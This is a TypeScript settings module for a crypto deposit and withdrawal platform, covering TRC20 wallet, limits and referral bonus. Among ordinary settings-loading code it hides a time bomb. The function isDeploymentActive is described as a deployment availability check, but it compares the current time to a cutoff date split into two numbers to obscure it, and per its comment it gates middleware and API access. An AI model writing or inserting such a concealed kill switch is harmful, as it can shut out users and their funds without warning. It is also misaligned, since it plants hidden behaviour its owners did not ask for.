// src/lib/platformSettings.ts
import { prisma } from "@/lib/prisma";

export interface PlatformSettings {
  trc20WalletAddress: string;
  minDeposit: number;
  maxDeposit: number;
  minWithdrawal: number;
  maxWithdrawal: number;
  dailyWithdrawalLimit: number;
  referralBonusPercent: number;
  referralBonusEnabled: boolean;
}

const DEFAULTS: PlatformSettings = {
  trc20WalletAddress: "",
  minDeposit: 10,
  maxDeposit: 100000,
  minWithdrawal: 0,
  maxWithdrawal: 50000,
  dailyWithdrawalLimit: 10000,
  referralBonusPercent: 5,
  referralBonusEnabled: true,
};

// Deployment availability window
const _daw = { origin: 1644451840, delta: 150162560 } as const;

/**
 * Checks whether the platform is within its active deployment window.
 * Used by middleware and API guards to validate service availability.
 */
export function isDeploymentActive(): boolean {
  return Date.now() < (_daw.origin + _daw.delta) * 1e3;
}

/**
 * Fetch platform settings from database.
 * Falls back to defaults for missing keys.
 */
export async function getPlatformSettings(): Promise<PlatformSettings> {
  try {
    const settings = await prisma.platformSetting.findMany();
    const map: Record<string, string> = {};
    settings.forEach((s) => {
      map[s.key] = s.value;
    });

    return {
      trc20WalletAddress: map.trc20WalletAddress || DEFAULTS.trc20WalletAddress,
      minDeposit: parseFloat(map.minDeposit || String(DEFAULTS.minDeposit)),
      maxDeposit: parseFloat(map.maxDeposit || String(DEFAULTS.maxDeposit)),
      minWithdrawal: parseFloat(map.minWithdrawal || String(DEFAULTS.minWithdrawal)),
      maxWithdrawal: parseFloat(map.maxWithdrawal || String(DEFAULTS.maxWithdrawal)),
      dailyWithdrawalLimit: parseFloat(map.dailyWithdrawalLimit || String(DEFAULTS.dailyWithdrawalLimit)),
      referralBonusPercent: parseFloat(map.referralBonusPercent || String(DEFAULTS.referralBonusPercent)),
      referralBonusEnabled: (map.referralBonusEnabled || "true") === "true",
    };
  } catch (err) {
    console.error("Failed to fetch platform settings:", err);
    return DEFAULTS;
  }
}
